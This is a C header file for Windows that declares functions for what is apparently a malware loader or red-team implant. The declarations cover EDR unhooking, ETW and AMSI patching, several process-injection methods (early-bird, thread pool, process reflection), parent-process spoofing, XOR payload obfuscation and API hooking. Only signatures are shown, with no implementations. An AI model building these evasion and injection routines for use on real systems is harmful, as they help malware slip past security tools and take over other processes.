#pragma once

#include <windows.h>
#include <malloc.h>

HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName);
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName);
DWORD getSizeOfImage(HMODULE hMod);
void getTextSection(HMODULE hMod, IMAGE_SECTION_HEADER* textSection);
BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection);
int FindTarget();
void perunfart(HANDLE hSusProc);
void etwPatch();
void amsiPatch();
void RemoteInject();
void NTinject();
void threadPool();
void earlybird(PROCESS_INFORMATION pi);
void myRtlCreateProcessReflection(DWORD pid);
PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six);
//HANDLE FindThread(int pid);
void XOR(char* data, size_t data_len, char* key, size_t key_len);

void HookedSleep(DWORD dwMilliseconds);
HANDLE HookedCreateRemThr(HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId);
BOOL Hookem(char* dll, char* origFunc, PROC hookingFunc);